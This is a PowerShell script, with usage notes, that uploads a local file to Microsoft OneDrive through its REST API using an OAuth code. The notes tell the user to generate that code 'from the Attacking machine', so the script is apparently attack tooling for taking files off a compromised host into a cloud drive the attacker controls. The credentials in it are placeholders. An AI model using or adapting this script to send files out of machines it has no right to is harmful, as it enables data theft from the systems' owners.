<#

DESCRIPTION
This Powershell script will upload a file to Microsoft OneDrive.  You must generate and supply a token for each upload attempt. 
Note - This script is for Powershell v3 only.  Also, this is a "Simple Item" upload and can only handle files up to 4MB. Tested and works
uploading .txt, .pdf, .docx, .xlsx.

-----------

USAGE
OneDriveUploadPSv3.ps1 MyFileToUpload.txt [one-time token]

-----------

TODO Prior to use 
1.  You will need a OneDrive Application ID (the client_id) and a Password (the client_secret).  To do this, register this app at https://apps.dev.microsoft.com.  You will need the Application ID and Password for this script for it to work.  Registration steps can
be found at https://gallery.technet.microsoft.com/How-to-use-OneDrive-Rest-5b31cf78

-----------

TO Generate Tokens
1.  From the Attacking machine, copy the following URL into a browser.  Add your client_id where indicated:  

https://login.live.com/oauth20_authorize.srf?client_id=YOUR_CLIENT_ID_GOES_HERE&scope=onedrive.readwrite offline_access&response_type=code&redirect_uri=https://localhost

2.  You may be prompted with a "allow this app to access your info" message (or something similiar to this). Click yes to proceed.  

3.  The browser URL field should now contain a new, usable, one-time use token similiar to this:
https://localhost/?code=Mb948a5a7-436c-d77e-f628-fb58eefc6097/

Just copy the string between "=" and "/"      

Remember, a token must be generated for EACH upload attempt.  Tokens are good for 1 hour, afterwards they will need to be regenerated.  

------------

MISC Notes
This script works on Powershell v3 only.  If the upload errors out, confirm you are using the right version.   

MISC Notes pt 2
This script is based heavily on chowdaryd's Google Drive Uploader.  Thanks man!

#>


Param(
    [Parameter(Mandatory=$true)]
    [string]$SourceFilePath,
    [Parameter(Mandatory=$true)]
    [string]$AccessToken
)
 
$body = @{
	code=$AccessToken;
	client_id="4bed5eb5-6d3f-4498-8dba-414d8wiseau9";   #####Add your Application ID here.
	client_secret="12SUPERSECRETPASSWORD21";	    #####Add your Password here.
	redirect_uri="https://localhost";
	grant_type="authorization_code";
};

$headers = @{}
$headers["Content-Type"] = 'application/x-www-form-urlencoded'

$tokens = Invoke-RestMethod -Uri https://login.live.com/oauth20_token.srf -Method POST -Headers $headers -Body $body;

$authorization = "Bearer "+ $tokens.access_token

$headers1 = @{}
$headers1["Authorization"] = $authorization
$headers1["Content-Type"] = 'application/octet-stream'


#Invoke-RestMethod -Uri https://api.onedrive.com/v1.0/drive/root:/uploaded:/content -Method PUT -Headers $headers1 -InFile $SourceFilePath

$Uri = "https://api.onedrive.com/v1.0/drive/root:/" + $SourceFilePath + ":/content"
Invoke-RestMethod -Uri $Uri -Method PUT -Headers $headers1 -InFile $SourceFilePath

 